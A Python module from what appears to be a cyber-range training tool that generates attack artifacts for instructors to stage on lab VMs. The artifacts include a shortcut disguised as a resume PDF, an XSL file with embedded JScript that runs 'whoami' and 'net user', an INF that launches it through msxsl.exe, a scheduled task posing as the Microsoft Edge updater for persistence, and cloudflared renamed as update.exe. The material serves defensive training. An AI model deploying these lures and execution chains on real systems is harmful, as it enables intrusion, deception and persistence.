"""File artifact generators.

Produces actual files that instructors can stage on VMs.
Types: lnk, xsl, inf, xml_task, binary_placeholder, raw
"""

from __future__ import annotations

from artiforge.core.models import FileArtifactSpec, GeneratedFile, Phase


# ── LNK (Windows Shortcut) — text stub with metadata ─────────────────────────
# Real .lnk is a binary format. We generate a README stub explaining how to
# create it, plus a PowerShell one-liner that builds the actual file.

def _gen_lnk(spec: FileArtifactSpec, phase: Phase) -> GeneratedFile:
    target = spec.lnk_target or r"C:\Windows\System32\ie4uinit.exe"
    args = spec.lnk_args or "-BaseSettings"
    dest = spec.dest or r"C:\Users\marcus.webb\Desktop\Resume_John_Smith.lnk"
    filename = dest.split("\\")[-1]

    content = (
        "# LNK File Stub — ArtiForge\n"
        "# Run the PowerShell snippet below on WIN-WS1 to create the lure file.\n\n"
        "$ws = New-Object -ComObject WScript.Shell\n"
        f'$lnk = $ws.CreateShortcut("{dest}")\n'
        f'$lnk.TargetPath = "{target}"\n'
        f'$lnk.Arguments = "{args}"\n'
        '$lnk.IconLocation = "C:\\Windows\\System32\\shell32.dll,1"\n'
        '$lnk.Description = "Resume_John_Smith.pdf"\n'
        "$lnk.Save()\n"
    )
    return GeneratedFile(
        phase_id=phase.id,
        filename=filename.replace(".lnk", ".lnk.ps1"),
        windows_dest=dest,
        content=content,
    )


# ── XSL stylesheet ────────────────────────────────────────────────────────────

_XSL_CONTENT = """\
<?xml version='1.0'?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:msxsl="urn:schemas-microsoft-com:xslt"
  xmlns:user="placeholder">
  <msxsl:script language="JScript" implements-prefix="user">
    <![CDATA[
      var r = new ActiveXObject("WScript.Shell");
      r.Run("cmd.exe /c whoami && net user", 0, true);
    ]]>
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="user:execute()"/>
  </xsl:template>
</xsl:stylesheet>
"""


def _gen_xsl(spec: FileArtifactSpec, phase: Phase) -> GeneratedFile:
    dest = spec.dest or r"C:\ProgramData\MicrosoftEdgeUpdate\style.xsl"
    filename = dest.split("\\")[-1]
    content = spec.content_template or _XSL_CONTENT
    return GeneratedFile(
        phase_id=phase.id,
        filename=filename,
        windows_dest=dest,
        content=content,
    )


# ── INF file ──────────────────────────────────────────────────────────────────

_INF_CONTENT = """\
[Version]
Signature="$CHICAGO$"

[DefaultInstall]
RunPreSetupCommands=RunCommands

[RunCommands]
cmd.exe /c "msxsl.exe C:\\ProgramData\\MicrosoftEdgeUpdate\\style.xsl C:\\ProgramData\\MicrosoftEdgeUpdate\\data.xml"
"""


def _gen_inf(spec: FileArtifactSpec, phase: Phase) -> GeneratedFile:
    dest = spec.dest or r"C:\Users\marcus.webb\AppData\Local\Temp\ie4uinit_setup.inf"
    filename = dest.split("\\")[-1]
    content = spec.content_template or _INF_CONTENT
    return GeneratedFile(
        phase_id=phase.id,
        filename=filename,
        windows_dest=dest,
        content=content,
    )


# ── XML Task Definition (disguised as .txt) ───────────────────────────────────

_XML_TASK_CONTENT = """\
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Keeps your Microsoft Edge browser up to date.</Description>
    <Author>Microsoft Corporation</Author>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>cmd.exe</Command>
      <Arguments>/c echo persistence_check</Arguments>
    </Exec>
  </Actions>
</Task>
"""


def _gen_xml_task(spec: FileArtifactSpec, phase: Phase) -> GeneratedFile:
    dest = spec.dest or r"C:\ProgramData\MicrosoftEdgeUpdate\update.txt"
    filename = dest.split("\\")[-1]
    content = spec.content_template or _XML_TASK_CONTENT
    return GeneratedFile(
        phase_id=phase.id,
        filename=filename,
        windows_dest=dest,
        content=content,
    )


# ── Binary placeholder (e.g., update.exe = cloudflared) ──────────────────────

def _gen_binary_placeholder(spec: FileArtifactSpec, phase: Phase) -> GeneratedFile:
    dest = spec.dest or r"C:\ProgramData\Microsoft\Windows\update.exe"
    filename = dest.split("\\")[-1]
    readme = (
        "# Binary Placeholder — ArtiForge\n"
        f"# Stage this file at: {dest}\n"
        "#\n"
        "# This should be a copy of the real cloudflared.exe binary\n"
        "# renamed to update.exe.\n"
        "#\n"
        "# Download cloudflared from:\n"
        "#   https://github.com/cloudflare/cloudflared/releases\n"
        "#\n"
        "# On WIN-WS1, run:\n"
        f'#   copy cloudflared.exe "{dest}"\n'
        "#\n"
        "# Real cloudflared SHA-256 for verification (example — check actual release):\n"
        "#   SHA256: <paste hash of downloaded binary here>\n"
    )
    return GeneratedFile(
        phase_id=phase.id,
        filename=f"{filename}.README.txt",
        windows_dest=dest,
        content=readme,
    )


# ── Raw content ───────────────────────────────────────────────────────────────

def _gen_raw(spec: FileArtifactSpec, phase: Phase) -> GeneratedFile:
    dest = spec.dest or r"C:\Temp\artifact.txt"
    filename = dest.split("\\")[-1]
    content = spec.content_template or f"# Placeholder for {dest}\n"
    return GeneratedFile(
        phase_id=phase.id,
        filename=filename,
        windows_dest=dest,
        content=content,
    )


# ── Dispatcher ────────────────────────────────────────────────────────────────

_FILE_GENERATORS = {
    "lnk":                _gen_lnk,
    "xsl":                _gen_xsl,
    "inf":                _gen_inf,
    "xml_task":           _gen_xml_task,
    "binary_placeholder": _gen_binary_placeholder,
    "raw":                _gen_raw,
}


def generate(spec: FileArtifactSpec, phase: Phase) -> GeneratedFile | None:
    fn = _FILE_GENERATORS.get(spec.type)
    if fn is None:
        raise ValueError(f"File artifact type '{spec.type}' not implemented. "
                         f"Available: {list(_FILE_GENERATORS)}")
    return fn(spec, phase)
